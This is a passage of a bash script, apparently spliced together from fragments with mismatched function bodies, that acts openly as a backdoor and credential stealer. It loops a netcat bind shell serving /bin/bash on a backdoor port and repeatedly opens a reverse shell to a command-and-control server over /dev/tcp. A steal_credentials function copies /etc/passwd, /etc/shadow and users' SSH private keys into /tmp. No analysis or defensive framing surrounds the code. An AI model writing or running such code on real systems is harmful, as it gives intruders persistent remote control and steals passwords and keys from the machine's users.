    # Create named pipe for communication
    mkfifo /tmp/backdoor_pipe 2>/dev/null
    
    # Start netcat listener
    while true; do
        nc -l -p $BACKDOOR_PORT -e /bin/bash >> $LOG_FILE 2>&1 &
        echo $! > $PID_FILE
        sleep 10
    done
}

    echo "Establishing C2 connection to $C2_SERVER" >> $LOG_FILE

        bash -i >& /dev/tcp/$C2_SERVER/8080 0>&1 2>>$LOG_FILE
        sleep 30
    done &
}

steal_credentials() {
    echo "Attempting credential theft" >> $LOG_FILE
    
    # Try to access password files
    if [ -f /etc/passwd ]; then
        cp /etc/passwd /tmp/passwd_backup
        echo "Password file copied" >> $LOG_FILE
    fi
    
    if [ -f /etc/shadow ]; then
        cp /etc/shadow /tmp/shadow_backup
        echo "Shadow file copied" >> $LOG_FILE
    fi
    
    # Look for SSH keys
    find /home -name "id_rsa*" -o -name "id_dsa*" 2>/dev/null | while read key; do
        cp "$key" /tmp/ssh_keys/

    done
}
